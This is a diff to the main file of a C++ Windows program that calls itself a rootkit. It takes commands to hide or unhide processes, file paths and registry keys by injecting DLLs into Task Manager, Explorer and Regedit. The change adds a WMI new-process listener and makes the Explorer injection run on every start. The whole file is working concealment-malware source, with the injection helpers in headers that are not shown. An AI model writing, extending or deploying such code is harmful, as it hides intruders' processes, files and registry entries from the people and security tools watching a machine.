@@ -1,12 +1,15 @@
 #include <iostream>
 #include <Windows.h>
 #include <vector>
+#include <WbemIdl.h>
+#include <comutil.h>
 #include <AccCtrl.h>
 #include <Aclapi.h> 
 #include <string>
 #include <unordered_map>
 #include "IPCObjects.h"
 #include "multiDLLInjector.h"
+#include "newProcessMonitor.h"
 
 using namespace std;
 
@@ -18,7 +21,7 @@ using namespace std;
 
 int main(int argc, char* argv[]){        
     unordered_map<string, vector<string>> injectionMap;
-    Serialitzator serialitzator("ipcObject");
+    Serialitzator serialitzator("");
 
     // Process
     vector<wchar_t*> processesToHide;    
@@ -48,8 +51,9 @@ int main(int argc, char* argv[]){
         serialitzator.serializeVectorWCharTPointer(deserializedStrings, L"agentMapped");
         injectionMap["Taskmgr.exe"] = { PROCESS_DLL };
         injectDlls(injectionMap);
+        newProcessListener();
 	}
-
+     
     // - rootkit.exe process unhide processname.exe
     if (argc == 4 && strcmp(argv[1], "process") == 0 && strcmp(argv[2], "unhide") == 0) {
         char* processName = argv[3];
@@ -64,6 +68,7 @@ int main(int argc, char* argv[]){
         serialitzator.serializeVectorWCharTPointer(deserializedStrings, L"agentMapped");
         injectionMap["Taskmgr.exe"] = { PROCESS_DLL };
         injectDlls(injectionMap);
+        newProcessListener();
     }
 
     if (argc == 4 && strcmp(argv[1], "path") == 0 && strcmp(argv[2], "hide") == 0){
@@ -75,8 +80,6 @@ int main(int argc, char* argv[]){
         wstring pathW(path, path + strlen(path));
         deserializedStrings.push_back(pathW);
         serialitzator.serializeVectorWString(deserializedStrings, L"pathMapped");
-        injectionMap["explorer.exe"] = { PATH_DLL };
-        injectDlls(injectionMap);
 	}
 
     if (argc == 4 && strcmp(argv[1], "path") == 0 && strcmp(argv[2], "unhide") == 0) {
@@ -87,14 +90,13 @@ int main(int argc, char* argv[]){
     if (argc == 4 && strcmp(argv[1], "registry") == 0 && strcmp(argv[2], "hide") == 0) {
 		// - rootkit.exe registry hide keyname
         vector<wstring> deserializedStrings = serialitzator.deserializeWStringVector(L"registryMapped");
-
-		// convert char* to wstring
 		char* key = argv[3];
 		wstring keyW(key, key + strlen(key));
 		deserializedStrings.push_back(keyW);
 		serialitzator.serializeVectorWString(deserializedStrings, L"registryMapped");
 		injectionMap["regedit.exe"] = { REGISTER_DLL };
         injectDlls(injectionMap);
+        newProcessListener();
     }
 
     // - rootkit.exe registry unhide keyname
@@ -102,8 +104,8 @@ int main(int argc, char* argv[]){
 		// - rootkit.exe registry unhide keyname
 	}
 
-    
-
+    injectionMap["explorer.exe"] = { PATH_DLL };
+    injectDlls(injectionMap);
     getchar();
 }
 
